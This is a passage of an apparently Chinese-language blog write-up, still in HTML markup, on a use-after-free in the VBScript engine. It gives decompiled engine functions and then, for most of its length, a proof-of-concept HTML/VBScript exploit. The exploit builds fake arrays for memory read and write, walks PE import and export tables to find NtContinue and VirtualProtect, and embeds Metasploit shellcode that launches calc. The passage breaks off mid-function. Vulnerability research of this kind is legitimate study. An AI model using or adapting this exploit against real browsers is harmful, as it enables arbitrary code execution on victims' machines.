class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __thiscall VBScriptClass::TerminateClass(VBScriptClass *this)</span><br><span class="line">{</span><br><span class="line">  VBScriptClass *v1; // esi@1</span><br><span class="line">  int result; // eax@1</span><br><span class="line">  VAR *v3; // ecx@2</span><br><span class="line">  struct IDispatch *v4; // eax@5</span><br><span class="line">  VARIANTARG pvarg; // [sp+4h] [bp-14h]@5</span><br><span class="line">  int v6; // [sp+14h] [bp-4h]@4</span><br><span class="line"></span><br><span class="line">  v1 = this;</span><br><span class="line">  result = NameTbl::FBaseThread(this);</span><br><span class="line">  if ( result )</span><br><span class="line">  {</span><br><span class="line">    v3 = (VAR *)*((_DWORD *)v1 + 7);//this+1c   &#x4FDD;&#x5B58;&#x4E00;&#x4E2A;&#x6307;&#x5411;&#x8BB0;&#x5F55;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x91CD;&#x8F7D;&#x4FE1;&#x606F;&#x7684;&#x7ED3;&#x6784;</span><br><span class="line">    if ( v3 )   //V3&#x4E0D;&#x4E3A;&#x7A7A;&#x7EE7;&#x7EED;&#xFF0C;this+1c &#x5904;&#x7684;&#x5B57;&#x6BB5;&#x5224;&#x65AD;&#x7528;&#x6237;&#x662F;&#x5426;&#x91CD;&#x8F7D;&#x4E86;TerminateClass&#x51FD;&#x6570;</span><br><span class="line">    {</span><br><span class="line">      if ( !*((_DWORD *)v1 + 8) )</span><br><span class="line">      {</span><br><span class="line">        *((_DWORD *)v1 + 8) = 1;</span><br><span class="line">        result = VAR::IsFunction(v3, (struct IEntryPoint **)&amp;v6);</span><br><span class="line">        if ( result )</span><br><span class="line">        {</span><br><span class="line">          v4 = (struct IDispatch *)(*(int (__thiscall **)(VBScriptClass *))(*(_DWORD *)v1 + 92))(v1);</span><br><span class="line">          VAR::SetIDispatch((VAR *)&amp;pvarg, v4);</span><br><span class="line">          (*(void (__stdcall **)(_DWORD, _DWORD, _DWORD, VARIANTARG *, signed int))(*(_DWORD *)v6 + 16))(</span><br><span class="line">            0,      //Vbscript!CscriptEntryPoint::Call</span><br><span class="line">            0,      //&#x8BE5;&#x51FD;&#x6570;&#x5C06;Trigger&#x7ED3;&#x6784;&#x4E2D;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;Terminate&#x51FD;&#x6570;&#x4F20;&#x9012;&#x7ED9;CScriptRuntime&#x7C7B; &#xFF0C;&#x4EA4;&#x7531;&#x865A;&#x62DF;&#x673A;&#x89E3;&#x91CA;&#x6267;&#x884C;</span><br><span class="line">            0,</span><br><span class="line">            &amp;pvarg,</span><br><span class="line">            2);</span><br><span class="line">          result = VAR::Clear(&amp;pvarg);//pvarg&#x7ED3;&#x6784;&#x6E05;&#x7406;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>Vbscript!CsciptEntryPoint::Call&#x9006;&#x5411;&#x7ED3;&#x679C;&#xFF1A;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">signed int __thiscall CScriptEntryPoint::Call(CScriptEntryPoint *this, VARIANTARG *a2, int a3, struct VAR *a4, VARIANTARG *pvargSrc, int a6)</span><br><span class="line">{</span><br><span class="line">  CScriptEntryPoint *v6; // esi@1</span><br><span class="line">  int v7; // eax@2</span><br><span class="line">  int v8; // esi@4</span><br><span class="line">  signed int result; // eax@4</span><br><span class="line">  char v10; // [sp+4h] [bp-E8h]@2</span><br><span class="line"></span><br><span class="line">  v6 = this;</span><br><span class="line">  if ( a3 == *(_WORD *)(*((_DWORD *)this + 4) + 36) )</span><br><span class="line">  {</span><br><span class="line">    CScriptRuntime::CScriptRuntime((CScriptRuntime *)&amp;v10);</span><br><span class="line">    v7 = CScriptRuntime::Init(*((volatile LONG **)v6 + 7), (int)v6 + 8, pvargSrc, a3, (int)a4, a6);</span><br><span class="line">    if ( v7 &gt;= 0 )</span><br><span class="line">      v7 = CScriptRuntime::Run(a2);</span><br><span class="line">    v8 = v7;</span><br><span class="line">    sub_6E4F18DB(&amp;v10);</span><br><span class="line">    result = v8;</span><br><span class="line">  }</span><br><span class="line">  else</span><br><span class="line">  {</span><br><span class="line">    result = -2146827838;</span><br><span class="line">  }</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6574;&#x4E2A;&#x7684;&#x91CA;&#x653E;&#x8FC7;&#x7A0B;&#x57FA;&#x672C;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x5F15;&#x7528;&#x8BA1;&#x6570;&#x6765;&#x5224;&#x65AD;&#x3002;&#x5728;&#x4E0A;&#x9762;&#x4F5C;&#x8005;&#x7684;&#x6587;&#x7AE0;&#x4E2D;&#xFF0C;&#x901A;&#x8FC7;&#x8865;&#x4E01;&#x5206;&#x6790;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#x903B;&#x8F91;&#x3002;</p>
+<h4 id="0x02-&#x6F0F;&#x6D1E;&#x5229;&#x7528;"><a href="#0x02-&#x6F0F;&#x6D1E;&#x5229;&#x7528;" class="headerlink" title="0x02 &#x6F0F;&#x6D1E;&#x5229;&#x7528;"></a><strong>0x02 &#x6F0F;&#x6D1E;&#x5229;&#x7528;</strong></h4><p>UAF&#x5728;&#x4E4B;&#x524D;&#x7684;HEVD&#x5B66;&#x4E60;&#x4E2D;&#xFF0C;&#x4E5F;&#x5927;&#x81F4;&#x5B66;&#x4E60;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x800C;&#x5229;&#x7528;&#x7684;&#x5173;&#x952E;&#xFF0C;&#x5219;&#x662F;&#x8981;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x60AC;&#x6302;&#x6307;&#x9488;&#x64CD;&#x4F5C;&#x5185;&#x5B58;&#x3002;</p>
+<p>&#x4E0B;&#x6765;&#xFF0C;&#x6211;&#x4EEC;&#x770B;&#x4E0B;POC:&#xFF08;&#x6D4B;&#x8BD5;&#x7248;&#x672C;&#xFF0C;&#x5176;&#x4E2D;MsgBox&#x548C;IsEmpty&#x4E3A;&#x6D4B;&#x8BD5;&#x9700;&#x8981;&#xFF0C;&#x53EF;&#x9002;&#x5F53;&#x589E;&#x51CF;&#xFF09;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br></pre></td><td class="code"><pre><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;SCRIPT LANGUAGE=&quot;VBScript&quot;&gt;</span><br><span class="line"></span><br><span class="line">Dim ab</span><br><span class="line">Dim wild_ref_arr_a(6), wild_ref_arr_b(6)</span><br><span class="line">Dim idx</span><br><span class="line">Dim aa(40)</span><br><span class="line">Dim fake_array, fake_str</span><br><span class="line">Dim rw_var</span><br><span class="line">Dim setprop_a_1, setprop_a_2</span><br><span class="line">Dim getp_a, getp_b</span><br><span class="line">Dim api_NtContinue, api_VirtualProtect</span><br><span class="line">rw_var = 195948557</span><br><span class="line"></span><br><span class="line">idx = 195890093</span><br><span class="line"></span><br><span class="line">fake_array = Unescape(&quot;%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000&quot;)</span><br><span class="line">fake_str   = Unescape(&quot;%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Function tostring(ByVal Number, ByVal Length)</span><br><span class="line">    str = Hex(Number)</span><br><span class="line">    If Len(str) &lt; Length Then</span><br><span class="line">        str = String(Length - Len(str), &quot;0&quot;) &amp;str</span><br><span class="line">    Else</span><br><span class="line">        str = Right(str, Length)</span><br><span class="line">    End If</span><br><span class="line">    tostring = str</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function addr2str(ByVal value)</span><br><span class="line">    Dim high, low</span><br><span class="line">    high = tostring((value And &amp;hffff0000) / &amp;h10000, 4)</span><br><span class="line">    low  = tostring(value And &amp;hffff&amp;, 4)</span><br><span class="line">    addr2str = Unescape(&quot;%u&quot; &amp;low &amp;&quot;%u&quot; &amp;high)</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function make_ntcontinue_bytes</span><br><span class="line">    Dim i, str_addr, bytes, v1_2, v3_4, v5_6, v7_8</span><br><span class="line">    </span><br><span class="line">    str_addr = tostring(api_NtContinue, 8)</span><br><span class="line">    v1_2 = Mid(str_addr, 1, 2)</span><br><span class="line">    v3_4 = Mid(str_addr, 3, 2)</span><br><span class="line">    v5_6 = Mid(str_addr, 5, 2)</span><br><span class="line">    v7_8 = Mid(str_addr, 7, 2)</span><br><span class="line">    </span><br><span class="line">    bytes = &quot;&quot;</span><br><span class="line">    bytes = bytes &amp;&quot;%u0000%u&quot; &amp;v7_8 &amp;&quot;00&quot;</span><br><span class="line">    </span><br><span class="line">    For i=1 To 3</span><br><span class="line">        bytes = bytes &amp;&quot;%u&quot; &amp;v3_4 &amp;v5_6</span><br><span class="line">        bytes = bytes &amp;&quot;%u&quot; &amp;v7_8 &amp;v1_2</span><br><span class="line">    Next</span><br><span class="line"></span><br><span class="line">    bytes = bytes &amp;&quot;%u&quot; &amp;v3_4 &amp;v5_6</span><br><span class="line">    bytes = bytes &amp;&quot;%u00&quot; &amp;v1_2</span><br><span class="line">    make_ntcontinue_bytes = Unescape(bytes)</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function make_virtualprotect_bytes(addr)</span><br><span class="line">    Dim bytes</span><br><span class="line">    bytes = String(&amp;h87ee&amp;, Unescape(&quot;%u4141&quot;))</span><br><span class="line">    bytes = bytes &amp;addr2str(addr)</span><br><span class="line">    bytes = bytes &amp;addr2str(addr)</span><br><span class="line">    bytes = bytes &amp;addr2str(&amp;h3000)</span><br><span class="line">    bytes = bytes &amp;addr2str(64)</span><br><span class="line">    bytes = bytes &amp;addr2str(addr - 8)</span><br><span class="line">    bytes = bytes &amp;String(6, Unescape(&quot;%u4242&quot;))</span><br><span class="line">    bytes = bytes &amp;make_ntcontinue_bytes()</span><br><span class="line">    bytes = bytes &amp;String((&amp;h80000 - LenB(bytes)) / 2, Unescape(&quot;%u4141&quot;))</span><br><span class="line">    make_virtualprotect_bytes = bytes</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function make_final_bytes(addr)</span><br><span class="line">    Dim bytes</span><br><span class="line">    Dim addr1</span><br><span class="line">    addr1 = addr + 35</span><br><span class="line">    bytes = &quot;&quot;</span><br><span class="line">    bytes = bytes &amp;addr2str(addr1)</span><br><span class="line">    bytes = bytes &amp;String((184 - LenB(bytes)) / 2, Unescape(&quot;%4141&quot;))</span><br><span class="line">    bytes = bytes &amp;addr2str(api_VirtualProtect)</span><br><span class="line">    bytes = bytes &amp;addr2str(27)</span><br><span class="line">    bytes = bytes &amp;addr2str(0)</span><br><span class="line">    bytes = bytes &amp;addr2str(addr)</span><br><span class="line">    bytes = bytes &amp;addr2str(35)</span><br><span class="line">    bytes = bytes &amp;String((1024 - LenB(bytes)) / 2, Unescape(&quot;%u4343&quot;))</span><br><span class="line">    make_final_bytes = bytes</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Sub trigger_var_clear</span><br><span class="line">    setprop_a_1.mem(rw_var) = &amp;h4d</span><br><span class="line">    MsgBox(&quot;trigger_var_clear&quot;)</span><br><span class="line">    setprop_a_1.mem(rw_var+8) = 0</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Function shellcode()</span><br><span class="line">    &apos; windows/exec - 196 bytes</span><br><span class="line">    &apos; http://www.metasploit.com</span><br><span class="line">    &apos; VERBOSE=false, EXITFUNC=process, CMD=calc</span><br><span class="line">    sc_str = Unescape(&quot;%u0000%u0000%u0000%u0000&quot;) &amp;Unescape(&quot;%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u0063&quot;)</span><br><span class="line">    shellcode = sc_str</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function GetUint32(addr)</span><br><span class="line">    Dim value</span><br><span class="line">    //IsEmpty(addr)</span><br><span class="line">    //MsgBox &quot;GetUint32&quot;</span><br><span class="line">    //IsEmpty(rw_var)</span><br><span class="line">    setprop_a_1.mem(rw_var + 8) = addr + 4</span><br><span class="line">    setprop_a_1.mem(rw_var) = 8</span><br><span class="line">    //IsEmpty(rw_var)</span><br><span class="line">    value = setprop_a_1.Read_Memory</span><br><span class="line">    setprop_a_1.mem(rw_var) = 2</span><br><span class="line">    GetUint32 = value</span><br><span class="line">    //IsEmpty(rw_var)</span><br><span class="line">    //IsEmpty(GetUint32) </span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function read_unit32_low_four(addr)</span><br><span class="line">    &apos; Note: &amp;hffff = -1, &amp;hffff&amp; = 0xffff = 65535</span><br><span class="line">    read_unit32_low_four = GetUint32(addr) And &amp;hffff&amp;</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function read_unit32_low_two(addr)</span><br><span class="line">    read_unit32_low_two = GetUint32(addr) And &amp;hff</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function cmp_str(str1, str2)</span><br><span class="line">    Dim str3, i</span><br><span class="line">    str3 = &quot;&quot;</span><br><span class="line">    For i = 0 To Len(str2) - 1</span><br><span class="line">        str3 = str3 &amp;Chr(read_unit32_low_two(str1 + i))</span><br><span class="line">    Next</span><br><span class="line">    cmp_str = StrComp(UCase(str3), UCase(str2))</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function GetBaseAddrByPoiAddr(addr)</span><br><span class="line">    Dim addr_allign</span><br><span class="line">    //MsgBox &quot;GetBaseAddrByPoiAddr&quot;</span><br><span class="line">    //IsEmpty(addr) </span><br><span class="line">    addr_allign = addr And &amp;hffff0000</span><br><span class="line">    //IsEmpty(addr_allign)</span><br><span class="line">    </span><br><span class="line">    &apos; 20 69 6E 20 44 4F 53 20 | in DOS </span><br><span class="line">    Do While GetUint32(addr_allign + &amp;h68) &lt;&gt; &amp;h206E6920 Or GetUint32(addr_allign + &amp;h6c) &lt;&gt; &amp;h20534F44</span><br><span class="line">        addr_allign = addr_allign - &amp;h10000</span><br><span class="line">    Loop</span><br><span class="line">    //IsEmpty(addr_allign)</span><br><span class="line">    </span><br><span class="line">    GetBaseAddrByPoiAddr = addr_allign</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Function GetModuleFromImport(mod_base, dllname)</span><br><span class="line">    Dim p,i,pImport</span><br><span class="line">    Dim delta</span><br><span class="line">    p = GetUint32(mod_base + 60) &apos; IMAGE_DOS_HEADER.e_lfanew</span><br><span class="line">    p = GetUint32(mod_base + p + 128) &apos; IMAGE_DIRECTORY_ENTRY_IMPORT</span><br><span class="line">    pImport = mod_base + p</span><br><span class="line">    i = 0</span><br><span class="line">    Do While True</span><br><span class="line">        Dim name_off</span><br><span class="line">        name_off = GetUint32(pImport + i*20 + 12) &apos; IAMGE_IMPORT_DESCRIPTOR.Name  &#x904D;&#x5386;&#x6A21;&#x5757;  &#x67E5;&#x627E;&#x6A21;&#x5757;</span><br><span class="line">        If name_off = 0 Then</span><br><span class="line">            GetModuleFromImport = 3131899904 &apos;&amp;hBAAD0000</span><br><span class="line">            Exit Function</span><br><span class="line">        Else</span><br><span class="line">            If cmp_str(mod_base + name_off, dllname) = 0 Then</span><br><span class="line">                Exit Do</span><br><span class="line">            End If</span><br><span class="line">        End If</span><br><span class="line">        i = i+1</span><br><span class="line">    Loop</span><br><span class="line">    delta = GetUint32(pImport + i*20 + 16)</span><br><span class="line">    GetModuleFromImport = GetBaseAddrByPoiAddr(GetUint32(mod_base + delta))</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Function GetProcAddress(mod_base, api_name)</span><br><span class="line">    Dim p,i,pExport</span><br><span class="line">    Dim pAddressOfFunctions,pNameBase,pAddressOfNameOrdinals</span><br><span class="line">    Dim ordinal</span><br><span class="line"></span><br><span class="line">    p = GetUint32(mod_base + 60 )       &apos; IMAGE_DOS_HEADER.e_lfanew</span><br><span class="line">    p = GetUint32(mod_base + p + 120)   &apos; IMAGE_DIRECTORY_ENTRY_IMPORT</span><br><span class="line"></span><br><span class="line">    pExport = mod_base + p</span><br><span class="line">    pAddressOfFunctions = mod_base + GetUint32(pExport + 28)    &apos; IMAGE_EXPORT_DIRECTORY.AddressOfFunctions</span><br><span class="line">    pNameBase = mod_base + GetUint32(pExport + 32)              &apos; IMAGE_EXPORT_DIRECTORY.AddressOfNames</span><br><span class="line">    pAddressOfNameOrdinals = mod_base + GetUint32(pExport + 36) &apos; IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals</span><br><span class="line"></span><br><span class="line">    i = 0</span><br><span class="line">    Do While True</span><br><span class="line">        Dim name_off</span><br><span class="line">        name_off = GetUint32(pNameBase + i*4)</span><br><span class="line">        If cmp_str(mod_base+name_off, api_name) = 0 Then</span><br><span class="line">            Exit Do</span><br><span class="line">        End If</span><br><span class="line">        i = i + 1</span><br><span class="line">    Loop</span><br><span class="line">    </span><br><span class="line">    ordinal = read_unit32_low_four(pAddressOfNameOrdinals + i*2)</span><br><span class="line">    p = GetUint32(pAddressOfFunctions + ordinal*4)</span><br><span class="line">    GetProcAddress = mod_base + p</span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Function read_longint</span><br><span class="line">    setprop_a_1.mem(rw_var) = 3</span><br><span class="line">    //MsgBox &quot;setprop_a_1.mem(rw_var) = 3&quot;</span><br><span class="line">    //IsEmpty(rw_var)           </span><br><span class="line">    read_longint = setprop_a_1.mem(rw_var+8)</span><br><span class="line">    //MsgBox &quot;read_longint = setprop_a_1.mem(rw_var+8)&quot;</span><br><span class="line">    //IsEmpty(read_longint) </span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Sub set_need_longint(ByRef a)</span><br><span class="line">    //MsgBox &quot;set_need_longint&quot;</span><br><span class="line">    //IsEmpty(setprop_a_1)</span><br><span class="line">    setprop_a_1.mem(rw_var+8) = a</span><br><span class="line">    //MsgBox &quot;setprop_a_1.mem(rw_var+8) = a&quot;</span><br><span class="line">    //IsEmpty(rw_var)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub EmptyFunc</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Function exp_c</span><br><span class="line">    On Error Resume Next 